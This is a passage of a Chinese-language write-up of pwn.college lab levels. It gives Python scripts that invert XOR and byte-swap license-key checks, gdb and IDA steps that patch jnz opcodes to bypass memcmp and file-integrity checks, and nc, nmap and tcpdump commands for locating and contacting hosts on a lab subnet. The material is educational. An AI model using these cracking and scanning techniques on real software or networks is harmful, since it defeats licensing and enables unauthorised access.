class="line">    <span class="string">"different operations on that input! You must figure out (by reverse engineering this program) what that license key is."</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Providing the correct license key will net you the flag!\n"</span>);</span><br><span class="line">  buf = <span class="number">0LL</span>;</span><br><span class="line">  v11 = <span class="number">0LL</span>;</span><br><span class="line">  v12 = <span class="number">0LL</span>;</span><br><span class="line">  v13 = <span class="number">0</span>;</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Ready to receive your license key!\n"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x1D</span>uLL);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">13</span>; ++i )</span><br><span class="line">  {</span><br><span class="line">    v6 = *((_BYTE *)&amp;buf + i);</span><br><span class="line">    *((_BYTE *)&amp;buf + i) = *((_BYTE *)&amp;buf + <span class="number">28</span> - i);</span><br><span class="line">    *((_BYTE *)&amp;buf + <span class="number">28</span> - i) = v6;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">28</span>; ++j )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">switch</span> ( j % <span class="number">5</span> )</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        *((_BYTE *)&amp;buf + j) ^= <span class="number">0xB4</span>u;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        *((_BYTE *)&amp;buf + j) ^= <span class="number">0xEC</span>u;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        *((_BYTE *)&amp;buf + j) ^= <span class="number">0x96</span>u;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        *((_BYTE *)&amp;buf + j) ^= <span class="number">0x33</span>u;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        *((_BYTE *)&amp;buf + j) ^= <span class="number">0xA</span>u;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">13</span>; ++k )</span><br><span class="line">  {</span><br><span class="line">    v5 = *((_BYTE *)&amp;buf + k);</span><br><span class="line">    *((_BYTE *)&amp;buf + k) = *((_BYTE *)&amp;buf + <span class="number">28</span> - k);</span><br><span class="line">    *((_BYTE *)&amp;buf + <span class="number">28</span> - k) = v5;</span><br><span class="line">  }</span><br><span class="line">  v3 = HIBYTE(v11);</span><br><span class="line">  HIBYTE(v11) = v13;</span><br><span class="line">  LOBYTE(v13) = v3;</span><br><span class="line">  v4 = BYTE4(buf);</span><br><span class="line">  BYTE4(buf) = BYTE6(v12);</span><br><span class="line">  BYTE6(v12) = v4;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Checking the received license key!\n"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(&amp;buf, &amp;unk_4010, <span class="number">0x1D</span>uLL) )</span><br><span class="line">  {</span><br><span class="line">    sub_12E9();</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Wrong! No flag for you!"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>参考上述伪代码我很快写出脚本，但是运行出来不正确，有两个字节无法解释为ASCII码，除了循环里的元素交换，这里也涉及到了元素交换，于是研究这段代码：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 下面三行代码的意思是将索引为 15 和 24 的元素互换位置，这里需要根据正确答案的起始索引进行计算</span></span><br><span class="line">v3 = HIBYTE(v11);  <span class="comment">// v11是64位int类型，v3获取其高8位，v11地址为 $rbp-0x28</span></span><br><span class="line">HIBYTE(v11) = v13; <span class="comment">// v13地址为 $rsp-0x18</span></span><br><span class="line">LOBYTE(v13) = v3;  <span class="comment">// 将v13的低8位设为v11的高八位</span></span><br><span class="line"><span class="comment">/* 通过gdb调试得到下面的结果，也就是将 0x52 和 0x68 互换</span></span><br><span class="line"><span class="comment">(gdb) x/gx $rbp-0x28</span></span><br><span class="line"><span class="comment">0x7fff397e3e28: 0x527ed69cf35b6fdf</span></span><br><span class="line"><span class="comment">(gdb) x/gx $rbp-0x18</span></span><br><span class="line"><span class="comment">0x7fff397e3e38: 0x000000be9be64a68</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//过程同上</span></span><br><span class="line">v4 = BYTE4(buf);</span><br><span class="line">BYTE4(buf) = BYTE6(v12);</span><br><span class="line">BYTE6(v12) = v4;</span><br></pre></td></tr></tbody></table></figure><blockquote><p>或者修改<code>buf</code>的类型，改为<code>char buf[29]</code>，这样就可以直接看见交换了哪两个元素</p></blockquote><p>最终脚本：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">s1 = [<span class="number">0x40</span>,  <span class="number">0xf3</span>,  <span class="number">0x82</span>,  <span class="number">0xd6</span>,  <span class="number">0x9b</span>,  <span class="number">0x57</span>,  <span class="number">0xe2</span>,  <span class="number">0x98</span>,  <span class="number">0xdf</span>,  <span class="number">0x6f</span>,  <span class="number">0x5b</span>,  <span class="number">0xf3</span>,  <span class="number">0x9c</span>,  <span class="number">0xd6</span>,  <span class="number">0x7e</span>,  <span class="number">0x68</span>,  <span class="number">0xff</span>,  <span class="number">0x94</span>,  <span class="number">0xd0</span>,  <span class="number">0x68</span>,  <span class="number">0x52</span>,  <span class="number">0xfd</span>,  <span class="number">0x63</span>,  <span class="number">0xc5</span>, <span class="number">0x52</span>,  <span class="number">0x4a</span>,  <span class="number">0xe6</span>,  <span class="number">0x9b</span>,  <span class="number">0xc3</span>]</span><br><span class="line">s2 = [<span class="number">0xb4</span>, <span class="number">0xec</span>, <span class="number">0x96</span>, <span class="number">0x33</span>, <span class="number">0xa</span>]</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">swap</span>(<span class="params">l, a, b</span>):</span><br><span class="line">tmp = l[a]</span><br><span class="line">l[a] = l[b]</span><br><span class="line">l[b] = tmp</span><br><span class="line"></span><br><span class="line">swap(s1, <span class="number">4</span>, <span class="number">22</span>)</span><br><span class="line">swap(s1, <span class="number">15</span>, <span class="number">24</span>)</span><br><span class="line"><span class="built_in">print</span>(s1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">14</span>):</span><br><span class="line">tmp = s1[k]</span><br><span class="line">s1[k] = s1[<span class="number">28</span>-k]</span><br><span class="line">s1[<span class="number">28</span>-k] = tmp</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s1)):</span><br><span class="line">s1[i] = s1[i] ^ s2[i%<span class="built_in">len</span>(s2)]</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">14</span>):</span><br><span class="line">tmp = s1[k]</span><br><span class="line">s1[k] = s1[<span class="number">28</span>-k]</span><br><span class="line">s1[<span class="number">28</span>-k] = tmp</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s1)):</span><br><span class="line">flag += <span class="built_in">chr</span>(s1[i])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></tbody></table></figure></li><li><p>level8.0：同7.0</p><p>wp：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">s1 = [<span class="number">0xe8</span>, <span class="number">0xb9</span>, <span class="number">0x7b</span>, <span class="number">0xe4</span>, <span class="number">0x85</span>, <span class="number">0xb5</span>, <span class="number">0xa5</span>, <span class="number">0xab</span>, <span class="number">0xea</span>, <span class="number">0xdc</span>, <span class="number">0x77</span>, <span class="number">0xf2</span>, <span class="number">0xbc</span>, <span class="number">0x33</span>, <span class="number">0xd9</span>, <span class="number">0x2c</span>, <span class="number">0x35</span>, <span class="number">0xed</span>, <span class="number">0x23</span>, <span class="number">0x05</span>, <span class="number">0x2d</span>, <span class="number">0x6d</span>, <span class="number">0x2a</span>, <span class="number">0x6f</span>, <span class="number">0x0a</span>, <span class="number">0xef</span>, <span class="number">0x75</span>, <span class="number">0x68</span>, <span class="number">0xa1</span>, <span class="number">0x53</span>, <span class="number">0x3d</span>, <span class="number">0xa7</span>, <span class="number">0x65</span>, <span class="number">0x34</span>, <span class="number">0x91</span>, <span class="number">0xa1</span>]</span><br><span class="line"></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">swap</span>(<span class="params">l, a, b</span>):</span><br><span class="line">tmp = l[a]</span><br><span class="line">l[a] = l[b]</span><br><span class="line">l[b] = tmp</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s1)//<span class="number">2</span>):</span><br><span class="line">swap(s1, i, <span class="built_in">len</span>(s1)-<span class="number">1</span>-i)</span><br><span class="line"></span><br><span class="line">x1 = <span class="number">0xed1b2fb3ae</span></span><br><span class="line">length = <span class="built_in">round</span>(x1.bit_length()/<span class="number">8</span>) </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s1)):</span><br><span class="line">s1[i] = s1[i] ^ (x1 &gt;&gt; ((length-<span class="number">1</span> - i%length)*<span class="number">8</span>)) &amp; <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line">swap(s1, <span class="number">2</span>, <span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">s2 = [<span class="number">0x8d95e5</span>, <span class="number">0xd58ddf</span>, <span class="number">0x77f189e87646</span>]</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s2)):</span><br><span class="line">length = <span class="built_in">round</span>(s2[j].bit_length()/<span class="number">8</span>)  <span class="comment"># 获取字节数</span></span><br><span class="line"><span class="built_in">print</span>(length)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s1)):</span><br><span class="line">s1[i] = s1[i] ^ (s2[j] &gt;&gt; ((length-<span class="number">1</span> - i%length)*<span class="number">8</span>)) &amp; <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line">s1.sort()  <span class="comment"># 排序</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s1)):</span><br><span class="line">flag += <span class="built_in">chr</span>(s1[i])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure></li><li><p>level8.1：同7.1，感觉题目给的提示不够，需要遍历所有排列组合？</p><p>wp：首先通过gdb找到目标十六进制</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x55f97ee2b020: 0xd8    0x9a    0x0f    0x91    0xf4    0x63    0x77    0xc8</span><br><span class="line">0x55f97ee2b028: 0x88    0x18    0x91    0xbc    0x47    0x5c    0xfc    0xb3</span><br><span class="line">0x55f97ee2b030: 0x20    0xa4    0xa0    0x25    0x38    0x8b    0x84    0x53</span><br><span class="line">0x55f97ee2b038: 0xe4    0x96    0x1e    0xf1    0x4d    0x38    0xa2    0x27</span><br><span class="line">0x55f97ee2b040: 0x50    0xd6    0xc1 </span><br></pre></td></tr></tbody></table></figure><p>根据IDA的反编译伪代码得到下面的脚本，但是不知道冒泡排序之前的数组元素顺序，无法得到flag</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">s1 = [<span class="number">0xd8</span>, <span class="number">0x9a</span>, <span class="number">0x0f</span>, <span class="number">0x91</span>, <span class="number">0xf4</span>, <span class="number">0x63</span>, <span class="number">0x77</span>, <span class="number">0xc8</span>, <span class="number">0x88</span>, <span class="number">0x18</span>, <span class="number">0x91</span>, <span class="number">0xbc</span>, <span class="number">0x47</span>, <span class="number">0x5c</span>, <span class="number">0xfc</span>, <span class="number">0xb3</span>, <span class="number">0x20</span>, <span class="number">0xa4</span>, <span class="number">0xa0</span>, <span class="number">0x25</span>, <span class="number">0x38</span>, <span class="number">0x8b</span>, <span class="number">0x84</span>, <span class="number">0x53</span>, <span class="number">0xe4</span>, <span class="number">0x96</span>, <span class="number">0x1e</span>, <span class="number">0xf1</span>, <span class="number">0x4d</span>, <span class="number">0x38</span>, <span class="number">0xa2</span>, <span class="number">0x27</span>, <span class="number">0x50</span>, <span class="number">0xd6</span>, <span class="number">0xc1</span>]</span><br><span class="line">s2 = [<span class="number">0xe7</span>, <span class="number">0x16</span>, <span class="number">0x9f</span>, <span class="number">0xe</span>, <span class="number">0x91</span>, <span class="number">0x33</span>]</span><br><span class="line">s3 = [<span class="number">0x27</span>, <span class="number">0x65</span>, <span class="number">0xf3</span>, <span class="number">0x68</span>, <span class="number">0x1f</span>, <span class="number">0x9a</span>, <span class="number">0x80</span>]</span><br><span class="line">s4 = [<span class="number">0x9</span>, <span class="number">0x8b</span>, <span class="number">0x58</span>, <span class="number">0x38</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">swap</span>(<span class="params">l, a, b</span>):</span><br><span class="line">tmp = l[a]</span><br><span class="line">l[a] = l[b]</span><br><span class="line">l[b] = tmp</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">35</span>):</span><br><span class="line">s1[j] ^= s3[j%<span class="number">7</span>]</span><br><span class="line"></span><br><span class="line">swap(s1, <span class="number">4</span>, <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">17</span>):</span><br><span class="line">swap(s1, n, <span class="number">34</span>-n)</span><br><span class="line"></span><br><span class="line">swap(s1, <span class="number">12</span>, <span class="number">23</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(s1)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">for k in range(0, 34):  # 冒泡排序</span></span><br><span class="line"><span class="string">for m in range(0, 34-k):</span></span><br><span class="line"><span class="string">if s1[m] &gt; s1[m+1]:</span></span><br><span class="line"><span class="string">swap(s1, m, m+1)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">35</span>):</span><br><span class="line">s1[j] ^= s2[j%<span class="number">6</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">35</span>):</span><br><span class="line">s1[i] ^= s4[i%<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(s1)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span>.join(<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> s1)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></tbody></table></figure></li><li><p>level9.0：此挑战允许修补二进制文件中的5个字节。（先做level10.0）</p><p>wp：同10.0</p></li><li><p>level9.1：同上</p></li><li><p>level10.0：修改一个字节得到flag。</p><p>wp：从discord那得到了提示，通过修改一个字节达到修改汇编指令的目的。先运行目标文件以及通过IDA查看运行逻辑，如下：</p><blockquote><p>输入地址偏移量--&gt;输入修改值--&gt;对应地址的值变为修改值--&gt;输入字符串--&gt;MD5--&gt;比较</p></blockquote><p>通过IDA查看汇编指令：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000000021B4                 call    _memcmp  # 返回值为rax</span><br><span class="line">.text:00000000000021B9                 test    eax, eax  # 两个值相与</span><br><span class="line">.text:00000000000021BB                 jnz     short loc_21D1</span><br></pre></td></tr></tbody></table></figure><p>若<code>test</code>指令结果不为0，则会跳转到失败函数中，所以这里将<code>jnz</code>改为<code>jz</code>就不会跳到失败函数中，根据这个<a href="http://ref.x86asm.net/coder64.html">网站</a>找到两个<strong>指令对应的十六进制</strong>。下一步就是需要确定偏移量的值。同gdb打开目标文件，直接查看<code>main</code>函数</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disas main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x0000000000001cf0 &lt;+0&gt;:     endbr64</span><br><span class="line">   0x0000000000001cf4 &lt;+4&gt;:     push   rbp</span><br><span class="line">   ......</span><br><span class="line">   ......</span><br><span class="line">   0x0000000000001d7b &lt;+139&gt;:   call   0x11b0 &lt;puts@plt&gt;</span><br><span class="line">   0x0000000000001d80 &lt;+144&gt;:   mov    edi,0xa</span><br><span class="line"></span><br><span class="line">   0x0000000000001ea9 &lt;+441&gt;:   mov    eax,0x0</span><br><span class="line">   0x0000000000001eae &lt;+446&gt;:   call   0x1280 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line">   0x0000000000001eb3 &lt;+451&gt;:   lea    rdi,[rip+0x14b7]        # 0x3371</span><br><span class="line">   0x0000000000001eba &lt;+458&gt;:   mov    eax,0x0</span><br><span class="line">   .......</span><br><span class="line">   0x0000000000001ed5 &lt;+485&gt;:   mov    eax,0x0</span><br><span class="line">   0x0000000000001eda &lt;+490&gt;:   call   0x1280 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line">   0x0000000000001edf &lt;+495&gt;:   movzx  ecx,BYTE PTR [rbp-0xc3]</span><br><span class="line">   .......</span><br><span class="line">(gdb) b *main+446  # 在第一个scanf处设置断点</span><br><span class="line">Breakpoint 1 at 0x1eae</span><br><span class="line">(gdb) run</span><br><span class="line">......</span><br><span class="line">Changing byte 1/1.</span><br><span class="line">Offset (hex) to change:</span><br><span class="line">Breakpoint 1, 0x00005627f9b96eae in main ()</span><br><span class="line">(gdb) bt</span><br><span class="line">#0  0x00005627f9b96eae in main ()</span><br><span class="line">(gdb) x/gx $rbp-0xa8   # 起始地址</span><br><span class="line">0x7fff68699ee8: 0x00005627f9b95000</span><br><span class="line">(gdb) disas main   # 再次查看main函数中的指令，此时每条指令有具体的地址</span><br><span class="line">0x00005627f9b971b4 &lt;+1220&gt;:  call   0x5627f9b96290 &lt;memcmp@plt&gt;</span><br><span class="line">0x00005627f9b971b9 &lt;+1225&gt;:  test   eax,eax</span><br><span class="line">0x00005627f9b971bb &lt;+1227&gt;:  jne    0x5627f9b971d1 &lt;main+1249&gt;</span><br></pre></td></tr></tbody></table></figure><p>得到<code>jne</code>的地址与起始地址相差<code>0x21bb</code>，即偏移量为<code>0x21bb</code>，再次运行目标文件：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Changing byte 1/1.</span><br><span class="line">Offset (hex) to change: 0x21bb</span><br><span class="line">New value (hex): 0x74</span><br><span class="line">The byte has been changed: *0x55dca42621bb = 74.</span><br></pre></td></tr></tbody></table></figure><p>然后任意输入几个字符串，回车得到flag</p></li><li><p>level10.1：同上</p></li><li><p>level11.0：可以修改两个字节，但是会检查文件完整性（哈希值）</p><p>wp：使用IDA查看伪代码，发现<code>memcmp</code>使用了两次（先比较哈希值，然后比较md5值），所以修改这两次条件跳转即可</p></li><li><p>level11.1：修改两个字节，检查文件完整性</p><p>wp：我一开始以为和11.0是一样的，但是输入两个修改字节后总是会有<code>Segmentation fault</code>，于是打开IDA查看两个条件跳转的十六进制（左边是地址，右边是指令的十六进制形式）：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x1B4D:    0F 85 E3 00 00 00</span><br><span class="line">0x1C32:    75 2C</span><br></pre></td></tr></tbody></table></figure><p>经过查询，有下面的知识点：</p><blockquote><p>在 x86 和 x86-64 指令集中，<code>jne</code>指令有两种编码方式，这取决于跳转的目标距离（即跳转的字节偏移量）。</p><ol type="1"><li><strong>短跳转</strong>：使用 8 位偏移量进行跳转，偏移量范围为 -128到 127 字节。这种情况下，<code>jne</code> 的操作码为<code>75</code>。</li><li><strong>长跳转</strong>：使用 32 位偏移量进行跳转，偏移量范围为-2,147,483,648 到 2,147,483,647 字节。这种情况下，<code>jne</code>的操作码为 <code>0F 85</code>。</li></ol></blockquote><p>所以输入偏移量时注意对应的字节：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Changing byte 1/2.</span><br><span class="line">Offset (hex) to change: 0x1b4e</span><br><span class="line">New value (hex): 0x84</span><br><span class="line">The byte has been changed: *0x55a4b4324b4e = 84.</span><br><span class="line">Changing byte 2/2.</span><br><span class="line">Offset (hex) to change: 0x1c32</span><br><span class="line">New value (hex): 0x74</span><br><span class="line">The byte has been changed: *0x55a4b4324c32 = 74.</span><br></pre></td></tr></tbody></table></figure><p>然后任意输入几个字符，回车得到flag</p></li></ul><h2 id="intercepting-communication">Intercepting Communication</h2><h3 id="知识点-4">知识点</h3><ul><li>以太网：通过Mac地址通信</li><li>IP协议：首部结构</li><li>TCP协议：首部结构，标志位</li><li>ARP协议</li><li>三次握手</li><li>工具：nc、tcpdump、ip、ifconfig、nmap</li></ul><h3 id="练习-4">练习</h3><ul><li><p>level1：连接远程主机</p><p>wp：监听目标主机的特定端口</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 10.0.0.3 31337</span><br></pre></td></tr></tbody></table></figure></li><li><p>level2：监听特定端口</p><p>wp：监听本地计算机上的端口</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l 31337</span><br></pre></td></tr></tbody></table></figure></li><li><p>level3：查找同一子网下的IP并监听31337端口</p><p>wp：使用nmap扫描同一子网下的IP，找到目标IP，然后使用nc连接对应端口</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@ip-10-0-0-2:~# nmap 10.0.0.0/24</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2024-07-28 09:54 UTC</span><br><span class="line">Nmap scan report for 10.0.0.129</span><br><span class="line">Host is up (0.000015s latency).</span><br><span class="line">Not shown: 999 closed ports</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">31337/tcp open  Elite</span><br><span class="line">MAC Address: 2A:AF:7A:12:1A:FC (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap scan report for 10.0.0.2</span><br><span class="line">Host is up (0.000010s latency).</span><br><span class="line">All 1000 scanned ports on 10.0.0.2 are closed</span><br><span class="line"></span><br><span class="line">Nmap done: 256 IP addresses (2 hosts up) scanned in 30.76 seconds</span><br><span class="line">root@ip-10-0-0-2:~# nc 10.0.0.129 31337</span><br><span class="line">pwn.college{oLZJSPC2WRMKubBDqz6KTgcvMm2.dFjNzMDLycDMyUzW}</span><br></pre></td></tr></tbody></table></figure></li><li><p>level4：在一个很大范围的子网中找到并连接目标主机</p><p>wp：与上一关解法相同，但是运行时间太长了</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap  10.0.0.0/16</span><br></pre></td></tr></tbody></table></figure></li><li><p>level5：监测远程主机的流量</p><p><code>tcpdump</code>是一个命令行数据包分析器，它可以捕获和分析网络流量。要监测特定端口上的流量</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i eth0&lt;网络接口&gt; port 31337  </span><br></pre></td></tr></tbody></table></figure><p><code>tcpdump</code>可以显示数据包的内容。要查看数据包的实际内容（包括负载），可以使用<code>-X</code> （显示数据包的十六进制和ASCII内容）或 <code>-A</code>选项（只显示数据包的ASCII内容）。</p><p>wp：首先通过<code>ifconfig</code>查看网络接口</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 